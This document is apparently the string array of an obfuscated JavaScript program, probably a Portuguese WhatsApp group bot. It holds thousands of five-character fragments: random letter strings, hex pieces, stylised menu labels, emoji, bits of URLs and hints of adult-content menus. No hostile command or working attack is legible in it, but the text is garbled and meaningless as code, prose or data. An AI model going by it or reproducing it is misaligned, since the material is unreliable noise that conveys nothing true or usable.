'rxnuG', 'mINmq', 'epo', '𝐀𝐍𝐈𝐌𝐄', 'oqaRh', "em pe", 'ULpoW', 'me/', " Bem-", '|5|3|', 'FLIYb', "d, vo", 'wgIsJ', 'kXFps', 'hrGtH', "` *", 'vence', 'lowjo', 'MNBpU', "2 nao", " a pe", "não a", 'FOuKD', 'ChlHP', "𝐇 𝐁𝐈𝐒", 'tclfd', 'cWxpw', 'CWIPq', 'rv-fo', 'uJVPd', 'mucoB', 'cRhsD', "r con", "bom m", 'OCXtr', 'rabén', 'ocura', 'NAZbk', 'hjxlA', 'al+St', 'uisa:', "ua po", 'uEJGp', 'rgwkI', "meu d", 'dinSQ', 'f1Zp5', 'Golds', '45f85', 'dKruM', 'rietá', 'om/we', 'BRXAz', 'ryzro', 'NuLHf', 'fRPsL', 'SCUBR', 'ermux', 'TwOeT', ". voc", "o: @", 'mbitg', 'bVdfi', 'mKRJV', '3|2|5', "00 ", 'mmSDQ', 'wWtMI', 'OkgJE', "i vid", "nk Gr", 'uceta', "a, só", "Como ", 'FAfpg', 'moRRQ', "E FOR", 'RyLwT', 'lXhja', "𝐒𝐅𝐖 𝐐", 'mazen', 'oEPXn', " 」\n║\n", 'xys', "o, nã", 'xjEps', "𝐍𝐒 🔞", 'Kvuyc', 'bULhE', 'jLtUs', 'oZitE', 'BHubE', 'pvEgI', 'XppYg', "or po", 'biIqN', "ão de", 'VtoWY', '/GTA_', 'HUbSr', 'iNPmN', 'lCqLa', 'tIcqQ', 'gHpyh', 'DcjWc', "s ai ", 'BKTts', 'pIdWJ', 'ae484', '_docn', 'iIBAW', 'CVEmh', 'rchvm', "e o l", 'zYehq', "ts an", 'isWin', 'teudo', 'OuLnW', 'fdUkY', 'CXOxS', 'fakem', "IS GA", 'iiqjN', 'VAALY', "lpe, ", 'joLkn', "4. 🔵 ", 'SXeQJ', 'AKEyX', 'strin', 'cSZuJ', 'ZXUkC', "  _- ", 'yOxtH', 'Isdrr', 'dsMLT', '=mess', 'WxJlB', " SHIG", " Códi", 'lZGzv', 'RARsj', 'jotiU', 'HGxET', 'nAHBc', 'lowni', 'PFLQK', "as, c", 'o✔️', "MB\n\n💻", '🎉Para', 'wEfHk', 'iYCZE', 'VZlBU', "𝐵𝑂𝑇: ", 'ZtKMk', 'goiHd', 'ezYRK', "rar m", 'pYBWS', 'BfOAD', '7f451', 'xVNxa', "r arq", 'lVEuI', '#meug', 'cAKXi', 'TXync', "ido a", 'nCTWq', 'ight=', 'dDNBA', 'tuali', 'UEFJo', "/5\n║ ", 'DvvWk', 'odLrm', "rta e", 'Htl37', 'xlsHW', 'DJtkp', 'TmObN', 'oAbMA', "for r", "elo t", "el*\n\n", 'dWMmy', "r o a", 'LIVdM', 'alien', "2. 🟡 ", "pede ", 'KthBl', 'rJYNB', 'abrac', 'CXXTq', " menc", 'LEEef', "n Ear", 'nseMe', 'qfSwa', "var /", "• *To", 'YNkZh', "os tr", 'AnlfC', 'VPuux', "oca d", '/gith', 'ossiv', 'FFGop', 'rKKHX', 'andos', 'Frifa', " REGI", 'short', ". Eu ", 'dBhZR', 'vMgYR', 'fyBMj', '-an', "🔞 𝐆𝐈𝐎", 'PYawr', "\n*DES", " da a", 'eRsWq', 'limit', 'yCfyo', "vier ", 'aFVrn', 'drNem', 'cyan', "*\nURL", 'secon', 'Mstyc', "d vai", '0|5', "s @", "]:\n\n@", '=32&t', 'bados', "do ba", 'YGtsH', 'WePCt', 'XabZz', "r car", 'ZiHoq', 're-li', 'lFYHV', "e Gru", 'FFUlx', 'cífic', "r em ", "ds qu", 'DEDhS', 'oNRXW', "33. 🔞", 'DgkwM', 'QesFd', 'oORWh', 'inha(', 'ilfTm', "s gan", "SO:*\n", " sem ", 'FQtBX', "m emo", "var. ", 'fUFOD', 'wYMCc', 'Cgaol', "id 🤣", 'KPtYM', 'infor', '(s)', " admi", " - --", 'etida', 'ximo', 'exfCa', 'ist', 'EwVUz', 'ado.', 'FAjqu', 'gif/m', '𝐒𝐎🔥', 'hTebv', "eu ", "o pel", '*🕹️JOG', "eva a", 'chuta', 'NWRuk', "por e", 'Ldbbz', 'mMfYi', 'gGAQp', 'róxim', 'CiYes', " Raci", "\n ° A", 'ogram', 'CHAND', 'szcon', 'AthxG', "👩🏾‍🦱 【✔】", 'rqxqi', 'LCmRw', "(a), ", 'mAfis', 'fixos', " @xpe", 'woahQ', 'brloP', "olds ", "ve em", 'jWgNB', 'QlvVl', 'ppqaJ', 'kOgTA', 'GVPvG', 'EghCD', 'BbjhS', "BOT P", " Ving", '9piBf', "E BOM", 'MzGFr', "ete n", " pack", 'MuIdp', 'HHUix', 'QYUDC', 'ZBGhz', 'jid', '&prop', 'KNnOP', '50f34', "- O c", 'plaq2', "d, us", ": *", 'icial', "[🦬] ", 'XFxCL', 'mvuQZ', 'tatic', 'mod_2', 'gZbOY', 'mlKlz', '697', '@fula', "ono, ", 'TvkIl', 't.0.b', 'ZRnjF', 'wmETv', 'pagad', 'sNOfB', 'qjcKY', 'res', "nho E", 'ructo', 'mbram', 'vbHWv', 'eYYUw', "gle: ", 'categ', "m dos", '=info', 'ntNfU', '𝒆𝒏𝒄𝒐𝒏', '9b-41', 'ZpEcY', 'tamp', 'hJSdT', 'ntrar', 'DhFoe', 'PaTcV', 'alavr', "a com", "O, BA", 'bXBRT', 'DanCN', "ADM p", 's://w', "m\n\n*⚠️", 'DCIQP', 'ideo2', 'WxLFE', '11cfb', 'xflkv', 'LFjsg', 'nUnqi', 'HVDNG', 'Key_D', 'PqfAq', 'rêmio', 'JPDZG', 't.jso', 'PIGGY', 'po/us', "a mão", 'dinha', 'uto', "E e e", 'cWaWt', 'escre', "air ", 'pZAjY', 'vKsoX', 'RifXc', 'winne', 'HsNIb', 'XldDX', 'accep', 'HdxPj', 'DZwNK', "irei ", 'EUhgv', 'blyai', 'dJWPY', 'te.', 'abuwP', '001b0', 'RLKio', 'gXLfj', "64 de", "e rem", 'etZxK', 'absol', '𝐈𝐒𝐓𝐄𝐌', "ig mc", " /30m", 'wOaXi', 'AdmNc', '5|7|3', 'WrrwG', "𝑫𝑬𝑶 🖥", 'cwGXG', 'WvASu', "🗑️\n\n\n\n", 'GwnME', 'lrYWG', 'yFDwG', "- @", '58610', 'ZAUjK', "lhe e", "erá i", 'uqtXt', 'mos-j', 'nCjXp', "Só po", 'apps/', 'nUnYI', 'lJQyu', "\nEsta", 'ermin', 'WgMLx', 'idth', '𝘼𝙂𝙎➭ׂ', 'arqui', 'UkVJB', 'rhUwE', "ot fo", 'Placa', 'Xvtzf', "ODE U", "go do", 'xyCLr', 'updat', "𝐍𝐓𝐎 ✅", " 𝐁𝐑𝐈𝐓", " Boa ", 'gxkoH', 'dZDtA', "aso n", "│\n╰──", 'uDsJc', 'WShZC', 'zbJVx', 'GjGeG', "ca li", 'ur2/P', 'HRFoV', 'iwIdQ', "es:\n ", 'xferg', 'FFvaB', 'OyShV', " area", "rso d", 'nmPcC', "%\n*Op", 'yiaXf', "o. At", 'NHipj', 'zRAlo', "sion ", 'api/i', 's/Vit', 'seqcu', "epo 1", 'TXbgF', 'jWges', 'Avass', "mg 0", "que o", 'ojucf', 'sxTdJ', 'xwBPV', 'lHsXj', '7m>', 'jlJhA', 'kfZLe', 'kHImB', 'eKpfs', 'HnOhw', 'lugue', 'IMAGE', 'blQWS', "65. ❄️", 'Mwiif', " ❄️ ×=", "sa ur", 'nKTfl', 'bgtVo', 'hubus', " sonh", "m aut", 'qySKE', 'econh', 'a76d2', "Do Gr", 'figde', 'JaXRn', 'zip', 'LXibb', "mpo d", 'ile/u', 's_f', "23. 🕹️", 'fhuZC', "\n\n ──", 'EFJFd', 'mXepG', 'ihZKP', 'gjhxW', 'eraçã', 'RQdAj', 'figen', 'fYQHb', 'enabl', 'JCtce', 'NuUea', 'Rei', "ts ay", 'zrSaA', 'RDBtB', 'uOZJY', "do da", 'jpxyt', 'wfuhR', 'lbum:', 'csUcw', 'dccaZ', 'mlx/C', "ja De", 'WGwVB', 'tInvi', 'OXFeO', 'meusc', "po, s", 'ckcku', 'gurar', 'keEwD', 'QKMaY', 'autho', 'eCFbx', "mirá ", "ts yo", 'beTUz', "❄️ 𝐒𝐄𝐍", 'com/V', "lds ", ":  ", "*「 *L", 'tjWnR', 'pocen', 'ymrwC', "rme u", 'Fudjk', "nar o", 'Inval', "ar\nEx", 'OyNbT', 'pacit', "hora ", 'ertir', 'cia', '22690', 'SvEOV', 'name.', " - Qu", "𝐎𝐌𝐄: ", 'fqrPN', 'hZKyU', 'eQlIg', 'po```', 'd1b56', './req', 'rde.', 'xPkep', 'yTYtM', " e cu", '8ac40', 'ponív', 'GFdOJ', 'fakec', 'yfans', 'xiMhU', 'igara', 'novad', 'KpFcw', 'comec', 'fEspm', 'KUckq', 'gSzpe', 'JAGtb', 'IADO*', '7dias', 'ZUVwO', 'Expir', 'bYPnN', 'tore', 'OPQYV', 'nail', 'opdxt', '119fc', " aten", " Dias", 'sCMfw', 'bwMcw', 'afavd', 'JdQVK', 'Qfjcr', "l ele", "ÍDO O", 'DKvRh', 'eeb0f', "as: ", 'tagaw', 'etbEY', 'xTQXe', "zar n", 'NKcWt', 'NJXru', 'icker', 'reati', 'sXSyH', 'IWdMU', 'VzMYe', 'kcXnZ', 'sendE', 'UnCCW', "o Voc", '𝐧𝐭𝐫𝐚𝐝', 'nFMQq', 'fGFDJ', 'kpaUr', 'TpGRy', "ig to", 'fy2', '9999-', "𝐋 ", 'vddAS', "s em ", 'ZAmKk', 'CGNNW', 'panti', 'IOASN', 'AGmRn', 'altan', " by A", 'ewTyp', 'GtVyd', 'tUXJS', 'omei', 'Galva', "o bol", 'qfqZH', 'rTqjG', 'e-se,', 'attpr', 'cIIUz', "ld, e", 'VcqEN', "u. Po", 'inici', 'cgwYv', "P PAR", "o, um", "\n*╰──", "do es", "a, e ", 'bcgp', "vou d", 'RTwIK', 'c62bb', 'CVZAP', 'vBFru', 'DjmNA', 'ubZyg', "m o l", "e exc", "ra da", " polí", " ou e", 'qgFbR', '📍Cria', '𝐅𝐈𝐆𝐔𝐑', 'NglYp', 'gsOGO', 'LBmLM', '.andr', "GUEL ", 'cSGdn', "fez a", 'usu1', 'WKXjE', 'velar', 'zwvaK', "📱 Cel", " Voto", "o scr", 'MLEzI', "guém ", "us: A", "RTO C", 'você.', 'ibIOL', '𝐏𝐇𝐈𝐍𝐄', 'WemMj', 'CJWpN', "oq vo", 'cessa', 'CCrEl', 'ajcgP', 'MhhKM', 'yiGbc', 'YdNwn', 'Prêmi', "ndo2 ", "ra de", 'LpOjf', "𝐒 𝐃𝐄 ", 'LXMCZ', 'afia', ", vai", " o do", 'iGFaz', 'delpr', 'stfig', 'AiMmV', " o áu", 'QiwOk', "/3\n\n", "ja bl", 'nUqKb', 'ips', '𝐒𝐎𝐌𝐄𝐍', "ro qu", "no Gr", 'jerbG', '╭┄━┄━', 'cta_c', "ARA O", 'ZSPqB', "te po", 'dbFIO', 'car', 'YeDaL', 'XcdTJ', "IVAL\n", 'QiMHu', 'YeGEI', "ADO* ", "ro do", "ker U", 'cJZbP', 'ZNsCN', 'YZQXO', 'MuWEe', "7. ❄️ ", "iu co", 'dejog', "*\nMen", 'Jyrib', 'orDrp', " Vide", "uém f", 'QAHRj', 'BYRcv', 'var9', 'Arqui', 'BLQiO', 'nhbns', "u 3 a", "🔞 𝐅𝐎𝐓", 'oBLJz', 'NXmHi', "\nOLÁ ", 'coXed', ". Fui", 'vitor', 'nça.', 'JAPqG', "mo de", 'age', 'RYuwu', "em tr", 'ORDLZ', "*\n \n@", 'kDFWq', 'oeseW', 'ze=62', "e exe", 'VEITE', 'oZZul', '𝐁𝐑𝐀𝐍𝐂', "ê esc", 'gljTf', 'gdTAa', 'MUXUi', 'ximo!', 'Jggpp', 'PTFvB', "RIOS ", 'fXgYZ', "\n\n➻ *", 'olone', 'BZuNz', '422sj', 'pen.s', '.ph/f', "🔞 𝐅𝐄𝐇", 'Ukuht', 'lmNIY', 'dQKAl', "o adm", 'yoGrg', "ção D", 'kFnPv', 'aZACB', 'zvylq', 'ado..', 'QdUSz', "se el", "ido d", ", nes", 'hRiDy', 'GUUut', " 15%,", 'ieASW', "Tá na", '┃✼❄', "IN BO", '5NEtD', 'IwKvm', 'iPvvr', 'sdds', 'nQFaL', 'qSyTL', 'bilid', "ara o", 'KES💸💳', 'qcFQH', "gra G", 'gDsrt', 'ges', 'rFhFO', 'TpnOa', '://i.', "ios e", "* AKI", "só ad", "ovo p", 'XVqdP', 'ZpErQ', 'quear', "\n*5 -", 'LONuN', 'HANxL', 'yZufM', 'dqFgE', 'ficad', 'WpJiD', 'ZbFiI', '𝐎𝐍𝐄𝐒𝐀', "ê ten", "\n💨   ", "i mes", 'nkdiv', 'nqBmB', 'userX', "ey, o", " inco", "ar, e", "RIR O", " crio", "\t\t\n\t\t", '3dsto', "❌ _Ne", 'pajZw', 'awrUr', 'GIQEk', 'zHCPv', "𝑫𝑰𝑶 2", 'MtSFt', 'meria', "Id De", '__Sec', "T SPR", 'XcNMO', "l par", 'oPOIy', 'AUfCG', 'sairt', 'GKtbB', "e *『S", " são ", 's.*', 'oQxyO', " noçã", "ste G", 'm:ss', "ela a", 'nsole', '0.pos', 'qGGZn', '-pres', "er ho", 'itaçã', 'nrqSC', 'uFeEz', 'dono1', 'Ptidd', 'EPbHJ', "IOS T", 'rkOXK', 'ir8pw', 'ticas', 'espec', "to:* ", 'EcPys', 'mEoMQ', " dete", 'Store', 'OPSjp', " espe", 'YckCo', "\nDica", 'awjDY', 'HVGes', "  🚀\n ", "ha na", "i Ima", 'rwvtv', 'Vmadr', 'onOJG', 'HcYmF', "lor a", 'aca', 'iTIPO', 'DkXry', "Uso d", 'r=utm', 'eMZPm', 'fgyNb', "a Con", '*Acer', "ndo O", 'xHidm', 'Eodup', 'OHreL', 'XeVvL', 'DwBxn', "5 gol", 'jtkdS', 'HiWHN', " : @", 'oader', 'psvuh', 'bjDgB', 'dUyuO', 'yjaqi', 'VMxkj', 'YrzPX', 'AHFad', 'pay', " é só", 'osta.', 'ckYkB', 'Portu', 'LpZJz', 'aSlLo', 'bdf08', "𝐄𝐃𝐈𝐔 ", "u o n", 'ziibB', '8f2da', 'PICeU', "𝐀𝐍𝐍𝐀 ", 'GopgV', 'lXWZy', 'cuUXu', 'gpMvn', " seu ", 'WBNmi', 'rHZAC', "odo g", 'msgan', 'GEcQn', '𝐄𝐎𝐋𝐄𝐎', 'MkSys', 'XCqaN', 'kvATL', "do po", '.me/', 'notíc', "de, e", 'hyQTh', 'EKdie', 'odMsk', 'KMMcn', "❄️ 𝐘𝐎𝐒", 'moção', 'WUhMk', '𝗡𝗢𝗠𝗜𝗬', 'QUzBs', "eza a", 'optio', 'SbiBy', 'para:', 'FQgyt', "es gr", 'WYydG', 'KtJRT', 'ongol', 'LAlAF', 'ZRCHu', "ogp 0", 'CHmSH', 'sVxbj', 'ld.', "ela p", 'ideo', "l\n\nBo", 'XFXFS', " ao l", 'VqXBz', 'JDmrb', 'reset', 'notaç', '+----', '800:8', 'fqnQB', 'eSqER', 'kwYwB', "(Por ", 'nt-di', " OBAN", "vel u", 'ezoNJ', "9 ✅", "o o c", 'bWbds', 'JglYc', 'ncerr', "te 0", 'ViffU', "to do", " brin", "a pag", "87. ❄️", "𝐔 +18", 'UzPBq', 'ítulo', 'tprov', 'urvBQ', 'ruto2', 'mUPPE', '_duel', '9f15a', 'WgTnK', "hega ", "𝐄 𝐅𝐀𝐅", "ox 🕹️\n", 'uGmQr', 'wlgVP', 'GZeoi', 'fjRVo', "por b", 'RkfhC', 'BFCSm', "✥➤ @", 'xZfLp', '1080p', " as r", 'ajiir', 'omple', 'MYubi', 'ZQolo', 'bmhV9', 'ZdXwS', 'nRtGZ', "o do ", 'rpMgE', 'nviar', 'ted!', 'VQzBy', 'gMizW', 'puta*', "OSOS ", 'ewQkJ', 'HJclL', "e min", "*\n*ID", 'LdArO', 'xnVNj', 'eOIIQ', '@Kaua', 'BCumt', 'gSTTX', 'ypRZL', 'ou?', "nha! ", 'VESbQ', "key r", 'alk?q', 'ém.', 'tiqVv', 'ping2', 'ewFmO', 'dLxAy', 'wSSVq', 'ar_us', 'MLXyE', 'rdibN', 'TTJDU', 'EFEIT', " ) No", 'o_lin', 'RJXlN', 'NAHWN', 'gistr', 'SKTdn', 'UUgwq', 'jkamL', 'axbwk', 'DlKXi', "i 🔞\n", 'rSYwH', 'Xlaik', 'xInJJ', "50% d", 'Ajypb', 'u/A3T', '.weig', 'jzsxz', 'nha', 'QqPSX', 'sitio', 'brJNL', "0 no ", 'rLxUp', "pus -", 'AKvEO', '▄▄█', "l pro", 'ook_a', "*A es", 'rZBfG', 'pkNQO', "\n - U", 'Wzigf', '.sh', 'EtoHp', "nk da", 'eTxmm', 'PTYTk', "l des", 'jnZzv', "e: ht", "u ja ", 'Pwchp', 'ldPwM', '20190', 'AeJjV', " dos ", '】ɢᴀᴅᴏ', 'dade/', 'OvHNy', 'OFczz', 'YekUy', 'HzJAs', "ão co", 'OIadP', 'ze=45', " Dese", '⁸|𝟖𝟖𝟖', 'issão', 'uzlkn', 'xccd5', 'DMMZY', 'IvjIn', " obse", 'EKDcJ', "o tim", " O te", 'dia|', 'nXkqi', 'xVzQt', 'OvCJX', 'toLoc', 'UZZvL', " um, ", 'MxwgB', 'bfYSm', "i loc", 'yQtMw', 'XkZmX', "OR EF", 'perfi', 'ocida', 'gifpa', 'arch', 'mfpLx', '*_💡Há', "22. 🕹️", "e ant", "𝐀𝐓𝐀𝟐 ", 'RyyAf', 'dFFNg', "sa es", 'hoNav', "Só us", 'nlGcb', 'thund', "6 ] ", "zero ", "A ten", 'odos,', 'RYLuL', "l pux", "ue pe", 'woeml', "ito a", "\n║\n╚┉", 'prnzP', 'ttps:', "o: Po", "o por", "a ess", 'death', 'horár', 'yHgMN', 'Megab', 'MkmOT', "ro: ", 'MEIRO', 'exter', 'mtWJj', "os ju", 'ata', 'ivvSd', "a ima", 'mQrAt', 'PUWmq', " ADM", " @Lot", 'DCgjn', 'icito', 'ngnLm', "vo JS", '237a0', 'icita', 'CYKmk', "ou cr", "inam ", 'dVqDO', 'RMrCC', 'brvJA', "do um", 'YNSVI', 'HfMOf', 'modif', '-scra', 'BrRJO', 'ximUZ', 'TuDlX', 'ueexn', 'sgMqW', 'Gnfwc', 'HvmUw', 'CIUpI', 'cido|', 'DehtJ', 'ThqkT', "O rec", 'r-men', 'iRNJp', 'wnzfS', "as 😪.", 'AktzL', "chat ", "O🔐 O ", 'rovue', 'getFu', 'cas1', 'Prefi', 'iYXgX', "*\n\n", 'ojigo', '5e3a1', "o Vis", " Obs:", 'packi', "e div", 'yinUr', 'MhopV', 'qaTZb', 'MsBfq', "ê ach", 'BUKOz', 'genda', 'isarã', 'gKNbn', "2 - 🎧", " o bo", 'Gif?', 'okOYa', "xos n", 'SNXda', 'avra_', 'Bem-V', 'aNziY', 'WcDaN', 'minar', 'cLFAt', 'lppCR', 'jdfYN', 'msCNL', "r cnv", 'AoXlE', 'cZXLl', 'UdjFo', 'artic', 'wJvNq', 'aLiCs', 'RDE!!', 'fDdIj', 'AUzde', 'XgJAX', 'dyJsh', 'NqXYh', "𝐎𝐏𝐄𝐒 ", "a peg", "or V ", 'MAXgs', "ium, ", 'tFzrR', '://mm', 'IqgLL', 'QggJM', 'KpiJY', 'matar', 'uHchX', "p ros", 'CrIcJ', 'IoMwe', 'HFMBc', 'nobbj', "elo f", " '74|", "mais ", '𝐀𝐂𝐊𝐒', 'GmUCH', 'onesa', 'yMBsC', 'eopYR', 'oftvx', 'wQKkL', 'JiAJa', "jogo ", 'KMqlx', "É A L", 'Wqdlf', 'Forma', "𝗨𝗥𝗔 🇯🇵", "sg no", "enu _", 'TLBQQ', 'jrCQB', 'vras_', "mt / ", "\n*Bio", 'GWIgI', 'HlFdy', 'wbaNI', 'EiyRq', 'hUHtP', "á com", "ade* ", 'WxvbH', 'WDFas', 'tSecr', 'ngSch', "no br", 'XTUPj', 'bfeCr', 'c5994', "ite 🌃", " vind", 'jeRsX', "upo?\n", 'OeDDN', "oi re", 'uCghX', 'base6', 'emplo', "foi e", 'ictur', 'ZgHPm', 'QwcyB', 'zxasW', "\nAs p", 'ciar', "🏆 Ran", "ia\n\nE", "ço qu", "[ OBS", 'lguém', 'MXOvz', 'OToTr', ", até", 'tgbov', 'wKzrG', 'ras', 'kKTZJ', 'RueqY', "pelo ", ")\n7. ", "t est", 'fWDNh', 'yQJfD', "𝐎 𝐑𝐄𝐒", " Hora", '2|0', 'sDWUJ', 'gDgut', "32. 🔞", 'Eemoh', 'outfi', '|1|4', 'OMBIE', 'body', 'AiODI', 'esent', 'HEhWs', 'wEaPc', " EM P", 'KaCFh', 'PHONE', 'uQUTB', 'eUfmc', 'itac', 'ybNhe', " se q", 'JWGJv', 'nwtEB', "ver n", 'UFIHH', 'pAvIB', 'HXLqD', " 𝐌𝐈𝐍𝐇", "\n\nLet", "ma me", 'cGDgm', 'os/Gr', 'dabv', 'oBkHu', 'jogo*', '𝐑𝐈𝐍𝐂𝐄', 'BcHdN', "ld su", 'sInnp', "- Só ", "ui es", 'ocorr', 'ikkwT', 'tdkZh', 'oXUgs', "🇯🇵 𝗧𝗘𝗝", 'Gpvfs', 'Vitor', 'ilia', " ~Mis", 'CeQZV', "lc2 p", 'bHPSo', "\nProg", 'YLEtI', 'rada?', 'list=', "Não s", 'fLVVw', 'NNDnl', 'SvifA', 'KfRAO', "❄️ 𝐆𝐎𝐊", 'sLfoj', "r o n", 'ctFfP', " \n Su", 'aqcod', 'amib', 'hcmvo', 'manJO', "igu 0", 'pace:', 'CJoiU', 'INECR', 'Implf', "99. 🔞", 'on/si', 'activ', 'ESCOL', " na s", 'uso..', 'AkjlN', "de fi", 'wFPIh', "into ", 'JXSzS', 'patin', 'ntavd', 'Xjteb', " 〕\n║\n", 'query', 'mKygG', "upo: ", 'ORBQe', 'jhmzN', 'nIzgg', "eu so", 'VkQyM', "não é", 'geId', 'HFWyO', 'FRWAh', 'nfigu', "uído ", 'uJleJ', 'izsKw', 'jAvuI', "á o s", 'wNcXh', "𝐀 𝐁𝐀𝐑", 'Mode', 'OMlAl', 'kFbYh', 'nxvPR', "ro ma", 'MjeHn', 'torAl', "otal ", "m con", 'KEvZo', 'cKaEt', "stro ", 'XGklD', "• *No", '】ɴɪɴɢ', 'sSync', " 0\nIs", 'hgYoq', "io: *", 'Proce', 'adJAK', 'xyOES', 'UNHWS', "ts to", 'lZoMA', '://um', 'upo).', 'rap', "❄️ 𝐎𝐍𝐄", "ocê p", 'XxFXL', 'VoGMT', 'nDTgZ', 'ciada', "nça v", 'FLAIt', 'gOruV', 'embro', 'desat', 'bcgc', "gora ", 'XifOI', 'NTICA', 'sbgQF', 'kcFoY', " 𝐀𝐏𝐊𝐬", 'up2-4', "𝐍𝐒 𝐕𝐈", "da já", 'Rlpvs', 'wins', 'MrEWO', 'etiXj', 'fgRzH', 'PqqJj', 'bnd21', 'VsTcC', 'zpTPK', " do a", 'rJQTb', 'NsgUi', 'GBlja', 'IdDJP', 'XKgPq', 'drkCp', " Nota", 'botoe', 'pix_s', 'VZV2i', "\nsó p", 'PAqoS', "🪨 Ped", 'stwvs', 'XLMXs', 'ivado', 'YsenE', 'YzFjg', 'seWLe', 'YNGIZ', 'CEzFK', 'WHYfZ', '|5|6|', 'lprth', 'LYacP', 'DCysy', "ém do", "g no ", 'JPZsA', 'TOVtr', 'EYEpa', 'IMOYu', 'Cacha', 'dizen', 'zNYAp', 'xclQf', 'lusão', 'ufici', 'Ntvuj', 'QJUEy', "a e f", 'tBlue', 'uivo,', "te 9.", 'FfEoX', 'EIfzw', '0@s.w', 'OznEB', 'iXaWu', "nem n", 'pcSJi', 'aguar', " ROBO", "la do", 'HDeBI', 'FSgNh', "do. D", "\n\n6: ", 'ter_c', 'aqMeV', 'szMCF', 'iRKPx', 'FxrgL', '459.4', 'yjcNV', "\n╟✼", 'RCzKZ', " Spam", "es ir", '*APTO', 'obbYb', 'MFkNS', "io já", "ão ro", 'oXvuZ', 'on/li', 'ZjUKy', "OIE T", 'SlFJp', 'fac85', "TA SU", 'ETpna', 'vyrmF', 'mod_1', 'wbJQQ', 'atado', 'PSID', "⚠️ *MU", 'earbi', 'RnFjE', 'KzolM', 'WeEJF', 'ctxSO', "el an", 'baIZs', 'umwBu', 'sGthb', 'fwkSS', '-BR.z', 'gGYYA', 'VkbTX', " TRIS", 'jogo', "nho p", '398', 'IoDJc', 'Ntt1P', '1e/Re', 'aixam', 'jKDtT', 'n/vnd', 'help', 'n/zip', 'rLfpI', "MAIS ", 'cSRaY', '545f0', 'Lsafu', 'rtist', 'rAiLx', '1cf44', 'OlUkR', 'cumen', 'opnYG', " dent", 'MPO──', "nha C", 'wDAOL', 'n=que', " invá", 'QGXgy', "tes d", "ma Ch", 'fhRZm', 'ter', "𝐌𝐈 ❄️", 'BwBaB', "sso s", 'JhHYh', "• *Co", 'lhosb', 'mRMDH', '-crop', 'PNMli', 'JfnsN', 'mxmrG', 'GzdFR', 'Kfblg', 'PNZIR', 'mWbvR', 'sGNdz', "╾❲ S ", 'sgSVN', 'FPHMB', " Angr", 'gitar', "1)\n9.", 'dxeOE', "tar q", 'reboa', 'zZbeA', 'IFrLL', "ão V", " vez.", 'Hztoa', 'y=100', " , es", "ndo, ", 'xtInf', "G não", 'nName', "zer a", 'BGveA', 'AjMSm', 'oníve', " wa.m", 'OEONZ', '?url=', 'dcLXx', "e a t", 'rrer,', 'geiLT', "min'(", 'acert', 'qTebU', 'qnbqy', 'clgQr', 'BJBMJ', '=gata', 'ELhWA', 'bdf32', " Mc P", "oar G", 'ImLMI', 'GlkbZ', 'DuFej', 'CqcSY', 'KQGew', 'gold.', 'gram', 'OgvNe', 'OGoen', "oad?\n", 'rYIaF', "𝗗𝗔𝗥𝗔 ", 'Zzwcy', "Jogo ", ", por", "ão I", '*Este', 'WasZV', '50.', 'MhIaZ', 'clare', "ero e", "\n• *I", 'FniNd', 'QECUk', "ste r", 'rforw', 'GPQnD', 'NXSgV', 'iuvRa', 'PxNpJ', 'cente', "as es", 'gqguk', "𝐃𝐕 ✅", "smo n", "❆╍╮\n┃", 'zxgyf', 'oskwS', "de ex", '|3|0|', " Sist", 'ekZco', 'ZJkqa', 'uKCZn', 'nick-', "𝐒𝐓𝐄𝟐 ", 'BeUGS', 'JIKAM', "- COM", " TOKI", "𝐄𝐎 ❌", "base ", 'rgbJd', 'xEaCJ', 'QmTCC', "eve a", 'atsap', 'juejl', 'Iaqjv', 'fjWmS', 'ffKuX', '.poin', 'displ', 'WriKL', 'FXykW', 'flEWg', 'ZAhxJ', 'DDQQC', "r ele", 'QIugY', 'bxlXk', 'KtjNj', 'JgthM', 'GnpPP', 'pyffe', "i ven", "MPO M", 'Bjlck', 'i.git', 'YZpFh', 'grama', 'fSpIW', "gtts ", 'dgold', 'LkVwC', "Day o", '=metr', " PV3:", 'QBwej', "𝑶𝑼 𝑺𝑬", "e \"Bo", "p/ *l", 'QZnLg', 'orrid', '1|3|0', " Lotu", 'inera', 'oban*', " 𝑨𝑷𝑹𝑬", '6Tena', ".▬▬▬\n", 'ezuel', "a arr", 'chLTd', 'lzqZT', "Kg\nE ", 'ito', 'GWQee', 'gKCco', 'uel', '𝐄🔥', " verm", 'PbAWR', 'DHHpM', "𝗞𝗔 𝗖𝗛", 'jogod', 'yTHXd', 'cStIp', 'TSKPX', 'fJEZG', 'qGHOp', 'KoUSj', 'iVlDz', 's-M4f', 'Local', " ver ", "%*\n📱 ", 'nsult', 'szhRg', 'VDAMM', 'AXevw', " ou d", 'SyaKH', '🧧【✔】ᴇ', "\n    ", "o\n│\n╰", 'JWGbW', 'wJnMx', 'h7uzR', "ara v", 'zViTa', 'EVAL', 'CIAR.', 'NKqKl', 'SUARI', 'ama', 'fRgyX', 'aoXlo', 'EQFTs', 'Canal', "i ima", 'KBWId', 'possu', "dos j", 'FpcxQ', 'lidos', 'SNNoL', 'vZUJr', 'GgVbk', 'jVRCU', "ão ar", 'to|An', "plo:\n", '3%258', 'nrPPf', 'tegam', 'PutWP', "ro ne", "ᴄᴀ💳\n ", 'UvJPH', 'iQAkn', 'FZrwt', 'VytIt', 'YBiJJ', "\nPróx", " Tent", 'pirar', 'wtywN', " 10 c", 'BSXVW', 'recol', 'ykylQ', "i nao", " 😈", 'sEluo', 'ssari', 'HEgXh', 'KEowB', 'tema', 'WIYfJ', "aria ", 'estem', 'creat', "e sor", 'dIvui', 'yZjsp', 'FaItG', 'wDzwb', "ra ap", 'ViLod', 'nbZMm', '6tyg0', "𝑰𝑫𝑬𝑶 ", 'vuQiK', 'rding', "𝗔 🇯🇵", 'pHoNm', 'sao-p', 'tempo', 'rbzly', 'yrzMz', 'RvNHe', 'VPewq', 'sh+Ba', 'lycia', 'zLcsT', 'wwrMe', 'RGiwq', "an 🕹️\n", " gast", 'FIhJJ', '1|0|3', 'on/de', "São ", 'nzSec', 'tenho', "r Don", 'FhvXw', 'SptQK', 'qJSUR', "ê per", '-mp4', 'SrqTX', "𝐚𝐫: ", 'pPEGn', 'qaLaW', 'es.jp', 'Ms7xe', 'FIElu', 'MINIS', 'hRnvP', 'simi1', 'wGIam', "em ho", 'FRaFM', "2 0", 'bd438', "á inc", 'DZylk', 'uQzld', 'KqLjX', 'iNnFc', 'KGmsT', " o pr", 'EDZsz', "Feio ", " mata", "ig re", 'Respe', " X  ", 'oVAYD', "E\n⚠️ •", "oque ", " Cont", 'r(a):', 'tJEtr', " Maru", 'rRfMT', 'KLlJl', 'mTKAb', "12. 🕹️", 'tMmOC', 